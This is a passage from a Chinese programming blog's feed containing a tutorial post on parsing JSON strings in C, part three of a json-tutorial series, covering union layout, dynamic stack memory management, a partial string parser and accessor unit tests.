u);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第四单元，重点在解析\uXXXX类型的字符串。&lt;/p&gt;</summary>
    
    
    
    <category term="项目" scheme="https://www.fvolcano.red/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="json" scheme="https://www.fvolcano.red/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>跟着做一个JSON解析器（三）</title>
    <link href="https://www.fvolcano.red/2021/Make-a-JSON-parser-3/"/>
    <id>https://www.fvolcano.red/2021/Make-a-JSON-parser-3/</id>
    <published>2021-08-04T00:42:05.000Z</published>
    <updated>2021-08-04T00:42:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第三单元，重点在于解析字符串类型。<a id="more"></a></p><p>👉<a href="https://github.com/miloyip/json-tutorial">原项目地址</a></p><h1 id="一、JSON-字符串语法"><a href="#一、JSON-字符串语法" class="headerlink" title="一、JSON 字符串语法"></a>一、JSON 字符串语法</h1><p>JSON 的字符串语法和 C 语言很相似，都是以双引号把字符括起来，如 <code>&quot;Hello&quot;</code>。但字符串采用了双引号作分隔，那么怎样可以在字符串中插入一个双引号？ 把 <code>a&quot;b</code> 写成 <code>&quot;a&quot;b&quot;</code> 肯定不行，都不知道那里是字符串的结束了。因此，我们需要引入转义字符（escape character），C 语言和 JSON 都使用 <code>\</code>（反斜线）作为转义字符，那么 <code>&quot;</code> 在字符串中就表示为 <code>\&quot;</code>，<code>a&quot;b</code> 的 JSON 字符串则写成 <code>&quot;a\&quot;b&quot;</code>。如以下的字符串语法所示，JSON 共支持 9 种转义序列：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">string</span> = quotation-mark *char quotation-mark</span><br><span class="line"><span class="attribute">char</span> = unescaped /</span><br><span class="line">   escape (</span><br><span class="line">       <span class="symbol">%x22</span> /          <span class="comment">; &quot;    quotation mark  U+0022</span></span><br><span class="line">       <span class="symbol">%x5C</span> /          <span class="comment">; \    reverse solidus U+005C</span></span><br><span class="line">       <span class="symbol">%x2F</span> /          <span class="comment">; /    solidus         U+002F</span></span><br><span class="line">       <span class="symbol">%x62</span> /          <span class="comment">; b    backspace       U+0008</span></span><br><span class="line">       <span class="symbol">%x66</span> /          <span class="comment">; f    form feed       U+000C</span></span><br><span class="line">       <span class="symbol">%x6E</span> /          <span class="comment">; n    line feed       U+000A</span></span><br><span class="line">       <span class="symbol">%x72</span> /          <span class="comment">; r    carriage return U+000D</span></span><br><span class="line">       <span class="symbol">%x74</span> /          <span class="comment">; t    tab             U+0009</span></span><br><span class="line">       <span class="symbol">%x75</span> <span class="number">4</span><span class="keyword">HEXDIG</span> )  <span class="comment">; uXXXX                U+XXXX</span></span><br><span class="line"><span class="attribute">escape</span> = <span class="symbol">%x5C</span>          <span class="comment">; \</span></span><br><span class="line"><span class="attribute">quotation-mark</span> = <span class="symbol">%x22</span>  <span class="comment">; &quot;</span></span><br><span class="line"><span class="attribute">unescaped</span> = <span class="symbol">%x20-21</span> / <span class="symbol">%x23-5B</span> / <span class="symbol">%x5D-10FFFF</span></span><br></pre></td></tr></table></figure><p>简单翻译一下，JSON 字符串是由前后两个双引号夹着零至多个字符。字符分为无转义字符或转义序列。转义序列有 9 种，都是以反斜线开始，如常见的 <code>\n</code> 代表换行符。比较特殊的是 <code>\uXXXX</code>，当中 XXXX 为 16 进位的 UTF-16 编码，本单元将不处理这种转义序列，留待下回分解。</p><p>无转义字符就是普通的字符，语法中列出了合法的码点范围（码点还是在下单元才介绍）。要注意的是，该范围不包括 <strong>0 至 31、双引号和反斜线</strong>，这些码点都必须要使用转义方式表示。</p><h1 id="二、字符串表示"><a href="#二、字符串表示" class="headerlink" title="二、字符串表示"></a>二、字符串表示</h1><p>在 C 语言中，字符串一般表示为空结尾字符串（null-terminated string），即以空字符（<code>&#39;\0&#39;</code>）代表字符串的结束。然而，JSON 字符串是允许含有空字符的，例如这个 JSON <code>&quot;Hello\u0000World&quot;</code> 就是单个字符串，解析后为11个字符。如果纯粹使用空结尾字符串来表示 JSON 解析后的结果，就没法处理空字符。</p><p>因此，我们可以分配内存来储存解析后的字符，以及记录字符的数目（即字符串长度）。<u>由于大部分 C 程序都假设字符串是空结尾字符串，我们还是在最后加上一个空字符，那么不需处理 <code>\u0000</code> 这种字符的应用可以简单地把它当作是空结尾字符串。</u></p><p>了解需求后，我们考虑实现。<code>lept_value</code> 事实上是一种变体类型（variant type），我们通过 <code>type</code> 来决定它现时是哪种类型，而这也决定了哪些成员是有效的。首先我们简单地在这个结构中加入两个成员：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    char* s;</span><br><span class="line">    size_t len;</span><br><span class="line">    double n;</span><br><span class="line">    lept_type type;</span><br><span class="line">&#125;lept_value;</span><br></pre></td></tr></table></figure><p>然而我们知道，一个值不可能同时为数字和字符串，因此我们可使用 C 语言的 <code>union</code> 来节省内存：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123; <span class="title">char</span>* <span class="title">s</span>;</span> size_t len; &#125;s;  <span class="regexp">/* string */</span></span><br><span class="line">        double n;                          <span class="regexp">/* number */</span></span><br><span class="line">    &#125;u;</span><br><span class="line">    lept_type <span class="keyword">type</span>;</span><br><span class="line">&#125;lept_value;</span><br></pre></td></tr></table></figure><p>这两种设计在 32 位平台时的内存布局如下，可看出右方使用 <code>union</code> 的能省下内存。</p><p><img src="/2021/Make-a-JSON-parser-3/union_layout.png" alt="union_layout"></p><p>我们要把之前的 <code>v-&gt;n</code> 改成 <code>v-&gt;u.n</code>。而要访问字符串的数据，则要使用 <code>v-&gt;u.s.s</code> 和 <code>v-&gt;u.s.len</code>。这种写法比较麻烦吧，其实 C11 新增了匿名 struct/union 语法，就可以采用 <code>v-&gt;n</code>、<code>v-&gt;s</code>、<code>v-&gt;len</code> 来作访问。</p><h1 id="三、内存管理"><a href="#三、内存管理" class="headerlink" title="三、内存管理"></a>三、内存管理</h1><p>由于字符串的长度不是固定的，我们要动态分配内存。为简单起见，我们使用标准库 <code>&lt;stdlib.h&gt;</code> 中的 <code>malloc()</code>、<code>realloc()</code> 和 <code>free()</code> 来分配／释放内存。</p><p>当设置一个值为字符串时，我们需要把参数中的字符串复制一份：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_set_string</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* s, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span> &amp;&amp; (s != <span class="literal">NULL</span> || len == <span class="number">0</span>));</span><br><span class="line">    lept_free(v);</span><br><span class="line">    v-&gt;u.s.s = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(v-&gt;u.s.s, s, len);</span><br><span class="line">    v-&gt;u.s.s[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    v-&gt;u.s.len = len;</span><br><span class="line">    v-&gt;type = LEPT_STRING;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断言中的条件是，非空指针（有具体的字符串）或是零长度的字符串都是合法的。</p><p>注意，在设置这个 <code>v</code> 之前，我们需要先调用 <code>lept_free(v)</code> 去清空 <code>v</code> 可能分配到的内存。例如原来已有一字符串，我们要先把它释放。然后就是简单地用 <code>malloc()</code> 分配及用 <code>memcpy()</code> 复制，并补上结尾空字符。<code>malloc(len + 1)</code> 中的 1 是因为结尾空字符。</p><p>那么，再看看 <code>lept_free()</code>：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">void</span> lept_free(lept_value* v) &#123;</span><br><span class="line">    assert(v != <span class="type">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (v-&gt;<span class="class"><span class="keyword">type</span> == <span class="type">LEPT_STRING</span>)</span></span><br><span class="line">        free(v-&gt;u.s.s);</span><br><span class="line">    v-&gt;<span class="class"><span class="keyword">type</span> = <span class="type">LEPT_NULL</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现时仅当值是字符串类型，我们才要处理，之后我们还要加上对数组及对象的释放。<code>lept_free(v)</code> 之后，会把它的类型变成 null。<u>这个设计能避免重复释放</u>。</p><p>但也由于我们会检查 <code>v</code> 的类型，在调用所有访问函数之前，我们必须初始化该类型。所以我们加入 <code>lept_init(v)</code>，因非常简单我们用宏实现：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define lept<span class="constructor">_init(<span class="params">v</span>)</span> <span class="keyword">do</span> &#123; (v)-&gt;<span class="keyword">type</span> = LEPT_NULL; &#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>用上 <code>do &#123; ... &#125; while(0)</code> 是为了把表达式转为语句，模仿无返回值的函数。</p><p>其实在前两个单元中，我们只提供读取值的 API，没有写入的 API，就是因为写入时我们还要考虑释放内存。我们在本单元中把它们补全：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lept_set_null(v) lept_free(v)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lept_get_boolean</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_set_boolean</span><span class="params">(lept_value* v, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">lept_get_number</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_set_number</span><span class="params">(lept_value* v, <span class="keyword">double</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">lept_get_string</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">lept_get_string_length</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_set_string</span><span class="params">(lept_value* v, <span class="keyword">const</span> <span class="keyword">char</span>* s, <span class="keyword">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure><p>由于 <code>lept_free()</code> 实际上也会把 <code>v</code> 变成 null 值，我们只用一个宏来提供 <code>lept_set_null()</code> 这个 API。</p><p>应用方的代码在调用 <code>lept_parse()</code> 之后，最终也应该调用 <code>lept_free()</code> 去释放内存。我们把之前的单元测试也加入此调用。</p><p>如果不使用 <code>lept_parse()</code>，我们需要初始化值，那么就像以下的单元测试，先 <code>lept_init()</code>，最后 <code>lept_free()</code>。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static void test<span class="constructor">_access_string()</span> &#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    lept<span class="constructor">_init(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">    lept<span class="constructor">_set_string(&amp;<span class="params">v</span>, <span class="string">&quot;&quot;</span>, 0)</span>;</span><br><span class="line">    <span class="constructor">EXPECT_EQ_STRING(<span class="string">&quot;&quot;</span>, <span class="params">lept_get_string</span>(&amp;<span class="params">v</span>)</span>, lept<span class="constructor">_get_string_length(&amp;<span class="params">v</span>)</span>);</span><br><span class="line">    lept<span class="constructor">_set_string(&amp;<span class="params">v</span>, <span class="string">&quot;Hello&quot;</span>, 5)</span>;</span><br><span class="line">    <span class="constructor">EXPECT_EQ_STRING(<span class="string">&quot;Hello&quot;</span>, <span class="params">lept_get_string</span>(&amp;<span class="params">v</span>)</span>, lept<span class="constructor">_get_string_length(&amp;<span class="params">v</span>)</span>);</span><br><span class="line">    lept<span class="constructor">_free(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四、缓冲区与堆栈"><a href="#四、缓冲区与堆栈" class="headerlink" title="四、缓冲区与堆栈"></a>四、缓冲区与堆栈</h1><p>我们解析字符串（以及之后的数组、对象）时，需要把解析的结果先储存在一个临时的缓冲区，最后再用 <code>lept_set_string()</code> 把缓冲区的结果设进值之中。（？）在完成解析一个字符串之前，这个缓冲区的大小是不能预知的。因此，我们可以采用动态数组（dynamic array）这种数据结构，即数组空间不足时，能自动扩展。C++ 标准库的 <code>std::vector</code> 也是一种动态数组。</p><p>如果每次解析字符串时，都重新建一个动态数组，那么是比较耗时的。我们可以重用这个动态数组，每次解析 JSON 时就只需要创建一个。而且我们将会发现，无论是解析字符串、数组或对象，我们也只需要以先进后出的方式访问这个动态数组。换句话说，我们需要一个动态的堆栈（stack）数据结构。</p><p>我们把一个动态堆栈的数据放进 <code>lept_context</code> 里：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* json;</span><br><span class="line">    <span class="keyword">char</span>* <span class="built_in">stack</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>, top;</span><br><span class="line">&#125;lept_context;</span><br></pre></td></tr></table></figure><p>当中 <code>size</code> 是当前的堆栈容量，<code>top</code> 是栈顶的位置（由于我们会扩展 <code>stack</code>，所以不要把 <code>top</code> 用指针形式存储）。</p><p>然后，我们在创建 <code>lept_context</code> 的时候初始化 <code>stack</code> 并最终释放内存：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> lept<span class="constructor">_parse(<span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>, <span class="params">const</span> <span class="params">char</span><span class="operator">*</span> <span class="params">json</span>)</span> &#123;</span><br><span class="line">    lept_context c;</span><br><span class="line">    <span class="built_in">int</span> ret;</span><br><span class="line">    <span class="keyword">assert</span>(v != NULL);</span><br><span class="line">    c.json = json;</span><br><span class="line">    c.stack = NULL;        <span class="comment">/* &lt;- */</span></span><br><span class="line">    c.size = c.top = <span class="number">0</span>;    <span class="comment">/* &lt;- */</span></span><br><span class="line">    lept<span class="constructor">_init(<span class="params">v</span>)</span>;</span><br><span class="line">    lept<span class="constructor">_parse_whitespace(&amp;<span class="params">c</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ret = lept<span class="constructor">_parse_value(&amp;<span class="params">c</span>, <span class="params">v</span>)</span>)<span class="operator"> == </span>LEPT_PARSE_OK) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">assert</span>(c.top<span class="operator"> == </span><span class="number">0</span>);    <span class="comment">/* &lt;- */</span></span><br><span class="line">    free(c.stack);         <span class="comment">/* &lt;- */</span></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在释放时，加入了断言确保所有数据都被弹出。</p><p>然后，我们实现堆栈的压入及弹出操作。和普通的堆栈不一样，我们这个堆栈是以字节储存的。每次可要求压入任意大小的数据，它会返回数据起始的指针（会 C++ 的同学可再参考[1]）：</p><p>lept_context_push: 保证栈的大小并返回栈顶位置</p><p>lept_context_pop: 调整top并返回pop值位置</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LEPT_PARSE_STACK_INIT_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEPT_PARSE_STACK_INIT_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">lept_context_push</span><span class="params">(lept_context* c, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* ret;</span><br><span class="line">    assert(<span class="built_in">size</span> &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;top + <span class="built_in">size</span> &gt;= c-&gt;<span class="built_in">size</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;<span class="built_in">size</span> == <span class="number">0</span>)</span><br><span class="line">            c-&gt;<span class="built_in">size</span> = LEPT_PARSE_STACK_INIT_SIZE;</span><br><span class="line">        <span class="keyword">while</span> (c-&gt;top + <span class="built_in">size</span> &gt;= c-&gt;<span class="built_in">size</span>)</span><br><span class="line">            c-&gt;<span class="built_in">size</span> += c-&gt;<span class="built_in">size</span> &gt;&gt; <span class="number">1</span>;  <span class="comment">/* c-&gt;size * 1.5 */</span></span><br><span class="line">        c-&gt;<span class="built_in">stack</span> = (<span class="keyword">char</span>*)<span class="built_in">realloc</span>(c-&gt;<span class="built_in">stack</span>, c-&gt;<span class="built_in">size</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = c-&gt;<span class="built_in">stack</span> + c-&gt;top;</span><br><span class="line">    c-&gt;top += <span class="built_in">size</span>;   <span class="comment">// 更新top</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">lept_context_pop</span><span class="params">(lept_context* c, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">    assert(c-&gt;top &gt;= <span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">return</span> c-&gt;<span class="built_in">stack</span> + (c-&gt;top -= <span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>压入时若空间不足，便回以 1.5 倍大小扩展。为什么是 1.5 倍而不是两倍？可参考 <a href="https://www.zhihu.com/question/25079705/answer/30030883">STL 的 vector 有哪些封装上的技巧？</a> 。</p><p>注意到这里使用了 <a href="https://en.cppreference.com/w/c/memory/realloc"><code>realloc()</code></a> 来重新分配内存，<code>c-&gt;stack</code> 在初始化时为 <code>NULL</code>，<code>realloc(NULL, size)</code> 的行为是等价于 <code>malloc(size)</code> 的，所以我们不需要为第一次分配内存作特别处理。</p><p>另外，我们把初始大小以宏 <code>LEPT_PARSE_STACK_INIT_SIZE</code> 的形式定义，使用 <code>#ifndef X #define X ... #endif</code> 方式的好处是，使用者可在编译选项中自行设置宏，没设置的话就用缺省值。</p><h1 id="五、解析字符串"><a href="#五、解析字符串" class="headerlink" title="五、解析字符串"></a>五、解析字符串</h1><p>有了以上的工具，解析字符串的任务就变得很简单。我们只需要先备份栈顶，然后把解析到的字符压栈，最后计算出长度并一次性把所有字符弹出，再设置至值里便可以。以下是部分实现，没有处理转义和一些不合法字符的校验。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUTC(c, ch) do &#123; *(char*)lept_context_push(c, sizeof(char)) = (ch); &#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_string</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> head = c-&gt;top, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* p;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;\&quot;&#x27;</span>);</span><br><span class="line">    p = c-&gt;json;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = *p++;</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">                len = c-&gt;top - head;</span><br><span class="line">                lept_set_string(v, (<span class="keyword">const</span> <span class="keyword">char</span>*)lept_context_pop(c, len), len);</span><br><span class="line">                c-&gt;json = p;</span><br><span class="line">                <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">                c-&gt;top = head;</span><br><span class="line">                <span class="keyword">return</span> LEPT_PARSE_MISS_QUOTATION_MARK;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                PUTC(c, ch);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、总结与练习答案"><a href="#六、总结与练习答案" class="headerlink" title="六、总结与练习答案"></a>六、总结与练习答案</h1><p>之前的单元都是固定长度的数据类型（fixed length data type），而字符串类型是可变长度的数据类型（variable length data type），因此本单元花了较多篇幅讲述内存管理和数据结构的设计和实现。字符串的解析相对数字简单，以下的习题难度不高，同学们应该可轻松完成。</p><ol><li>编写 <code>lept_get_boolean()</code> 等访问函数的单元测试，然后实现。</li></ol><p>访问函数的实现：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> lept<span class="constructor">_get_boolean(<span class="params">const</span> <span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">assert</span>(v != NULL<span class="operator"> &amp;&amp; </span>(v-&gt;<span class="keyword">type</span><span class="operator"> == </span>LEPT_TRUE<span class="operator"> || </span>v-&gt;<span class="keyword">type</span><span class="operator"> == </span>LEPT_FALSE));</span><br><span class="line">    return v-&gt;<span class="keyword">type</span><span class="operator"> == </span>LEPT_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void lept<span class="constructor">_set_boolean(<span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>, <span class="params">int</span> <span class="params">b</span>)</span> &#123;</span><br><span class="line">    lept<span class="constructor">_free(<span class="params">v</span>)</span>;</span><br><span class="line">    v-&gt;<span class="keyword">type</span> = b ? LEPT_TRUE : LEPT_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double lept<span class="constructor">_get_number(<span class="params">const</span> <span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">assert</span>(v != NULL<span class="operator"> &amp;&amp; </span>v-&gt;<span class="keyword">type</span><span class="operator"> == </span>LEPT_NUMBER);</span><br><span class="line">    return v-&gt;u.n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void lept<span class="constructor">_set_number(<span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>, <span class="params">double</span> <span class="params">n</span>)</span> &#123;</span><br><span class="line">    lept<span class="constructor">_free(<span class="params">v</span>)</span>;</span><br><span class="line">    v-&gt;u.n = n;</span><br><span class="line">    v-&gt;<span class="keyword">type</span> = LEPT_NUMBER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编写单元测试时，我们故意先把值设为字符串，那么做可以测试设置其他类型时，有没有调用 <code>lept_free()</code> 去释放内存。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static void test<span class="constructor">_access_boolean()</span> &#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    lept<span class="constructor">_init(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">    lept<span class="constructor">_set_string(&amp;<span class="params">v</span>, <span class="string">&quot;a&quot;</span>, 1)</span>;</span><br><span class="line">    lept<span class="constructor">_set_boolean(&amp;<span class="params">v</span>, 1)</span>;</span><br><span class="line">    <span class="constructor">EXPECT_TRUE(<span class="params">lept_get_boolean</span>(&amp;<span class="params">v</span>)</span>);</span><br><span class="line">    lept<span class="constructor">_set_boolean(&amp;<span class="params">v</span>, 0)</span>;</span><br><span class="line">    <span class="constructor">EXPECT_FALSE(<span class="params">lept_get_boolean</span>(&amp;<span class="params">v</span>)</span>);</span><br><span class="line">    lept<span class="constructor">_free(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void test<span class="constructor">_access_number()</span> &#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    lept<span class="constructor">_init(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">    lept<span class="constructor">_set_string(&amp;<span class="params">v</span>, <span class="string">&quot;a&quot;</span>, 1)</span>;</span><br><span class="line">    lept<span class="constructor">_set_number(&amp;<span class="params">v</span>, 1234.5)</span>;</span><br><span class="line">    <span class="constructor">EXPECT_EQ_DOUBLE(1234.5, <span class="params">lept_get_number</span>(&amp;<span class="params">v</span>)</span>);</span><br><span class="line">    lept<span class="constructor">_free(&amp;<span class="params">v</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们没有调用 <code>lept_free()</code>，会发生内存泄露，如何发现这些内存泄漏呢？</p><blockquote><p>内存泄漏是指你向系统申请分配内存进行使用(new)，可是使用完了以后却不归还(delete)，结果你申请到的那块内存你自己也不能再访问（也许你把它的地址给弄丢了，在这里是因为lept_type不是LEPT_STRING了，存储的字符串地址无意义不能访问），而系统也不能再次将它分配给需要的程序。</p></blockquote><h2 id="1A-Windows-下的内存泄漏检测方法"><a href="#1A-Windows-下的内存泄漏检测方法" class="headerlink" title="1A. Windows 